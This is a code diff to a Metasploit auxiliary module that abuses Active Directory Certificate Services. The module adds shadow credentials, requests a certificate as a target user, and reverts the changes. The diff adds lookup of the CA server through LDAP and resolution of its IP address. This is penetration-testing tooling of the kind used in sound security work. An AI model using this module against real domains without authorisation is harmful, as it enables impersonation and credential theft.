@@ -7,6 +7,7 @@ require 'ruby_smb/dcerpc/client'
 
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::LDAP
+  include Msf::Exploit::Remote::LDAP::ActiveDirectory
   include Msf::Exploit::Remote::MsIcpr
   include Msf::Exploit::Remote::SMB::Client::Authenticated
   include Msf::Exploit::Remote::DCERPC
@@ -89,6 +90,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
+    @dc_ip = datastore['RHOSTS']
     validate_options
     send("action_#{action.name.downcase}")
   rescue MsIcprConnectionError, SmbIpcConnectionError => e
@@ -214,19 +216,63 @@ class MetasploitModule < Msf::Auxiliary
       @device_id, cert_path = call_shadow_credentials_module('add')
       smbpass = automate_get_hash(cert_path, datastore['TARGET_USERNAME'], datastore['LDAPDomain'], datastore['RHOSTS'])
     end
-
+    ca_ip = resolve_ca_ip
     with_ipc_tree do |opts|
       datastore['SMBUser'] = datastore['TARGET_USERNAME']
       datastore['SMBPass'] = smbpass
+      datastore['RHOSTS'] = ca_ip
       request_certificate(opts)
     end
   ensure
+    datastore['RHOSTS'] = @dc_ip
     unless @device_id.nil?
       print_status('Removing shadow credential')
       call_shadow_credentials_module('remove', device_id: @device_id)
     end
     print_status('Reverting ldap object')
     revert_ldap_object
+  end
+
+  def resolve_ca_ip
+    vprint_status('Finding CA server in LDAP')
+    ca_servers = []
+    ldap_connect(port: datastore['LDAPRport']) do |ldap|
+      validate_bind_success!(ldap)
+      if (@base_dn = datastore['BASE_DN'])
+        print_status("User-specified base DN: #{@base_dn}")
+      else
+        print_status('Discovering base DN automatically')
+
+        unless (@base_dn = ldap.base_dn)
+          fail_with(Failure::NotFound, "Couldn't discover base DN!")
+        end
+      end
+      ca_servers = adds_get_ca_servers(ldap)
+      vprint_status("Found #{ca_servers.length} CA servers in LDAP")
+    end
+
+    if ca_servers.empty?
+      fail_with(Msf::Module::Failure::UnexpectedReply, 'No Certificate Authority servers found in LDAP.')
+      return
+    else
+      ca_servers.each do |ca|
+        vprint_good("Found CA: #{ca[:name]} (#{ca[:dNSHostName]})")
+      end
+    end
+
+    ca_entry = ca_servers.find { |ca| ca[:name].casecmp?(datastore['CA']) }
+
+    unless ca_entry
+      fail_with(Msf::Module::Failure::UnexpectedReply, "CA #{datastore['CA']} not found in LDAP. Checking registry values is unable to continue")
+    end
+
+    ca_dns_hostname = ca_entry[:dNSHostName]
+    ca_ip_address = Rex::Socket.getaddress(ca_dns_hostname, false)
+    unless ca_ip_address
+      print_error("Unable to resolve the DNS Host Name of the CA server: #{ca_dns_hostname}. Checking registry values is unable to continue")
+      return
+    end
+    ca_ip_address
   end
 
   def revert_ldap_object
